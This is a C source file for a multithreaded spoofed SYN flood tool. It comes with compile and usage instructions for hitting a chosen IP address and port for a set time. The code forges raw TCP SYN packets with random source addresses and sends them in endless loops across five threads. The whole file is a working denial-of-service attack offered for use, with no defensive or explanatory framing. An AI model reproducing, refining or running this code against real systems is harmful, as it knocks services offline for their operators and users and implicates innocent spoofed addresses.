/*
	Compile:
		apt-get update
		apt-get install gcc
		gcc ssyn.c -pthread -o ssyn
	Usage: ./ssyn ip port time
*/
#include <stdio.h>
#include <stdlib.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <pthread.h>
#include <errno.h>

#define THREADS 5


typedef struct pthread_param
{
	int argc;
	char **argv;
};
 
typedef struct pseudo_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
};

/* Thanks for unknown author, this saves me some time */
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
 
    return(answer);
}

int attack(int argc, char *argv[])
{
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    char packet[4096];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
	char ip[16];
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr (argv[1]);
	
	sprintf(ip, "%d.%d.%d.%d\n", rand() % 223, rand() % 255, rand() % 255, rand() % 255);
 
    memset (packet, 0, 4096);
 
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htonl (54321); 
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; 
    iph->saddr = inet_addr(ip); 
    iph->daddr = sin.sin_addr.s_addr;
 
    iph->check = csum ((unsigned short *) packet, iph->tot_len >> 1);
 
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840);
    tcph->check = 0;/* We fill this in later */
    tcph->urg_ptr = 0;
 
    psh.source_address = inet_addr(ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
 
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
 
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
 
    //IP_HDRINCL needed for own headers
	int one = 1;
	const int *val = &one;
	int sockop = setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)); 
	if (sockop < 0)
	{
		perror ("[x] Error msg: ");
		printf ("[x] Cannot set socket options: %i (are we r00t?)\n", errno);
		// exit(-1);
	}
 
	if (sendto (s, packet, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		printf ("[x] Error sending packet\n");
 
	close(s);
    return 0;
}

void *thread_attack(void *thread_params)
{
	struct pthread_param *params = thread_params;
	
	while (1)
		attack(params->argc, params->argv);
}
 
int main (int argc, char *argv[])
{
	int i;
	printf("Spoofed SYN Attack\n");
	
	srand(time(0));
	
	if (argc != 4)
	{
		printf("Usage: %s <destip> <destport> <time in seconds>\n", argv[0]);
		return -1;
	}
	
	pthread_t ssyn_attack[THREADS];
	
	struct pthread_param params;
	params.argc = argc;
	params.argv = argv;
	
	for (i = 0; i < THREADS; i++)
		pthread_create( &ssyn_attack[i], NULL, thread_attack, (void*) &params);
	
	
	printf("[*] Attacking..\n");
	sleep(atoi(argv[3]));
	
	return 0;

}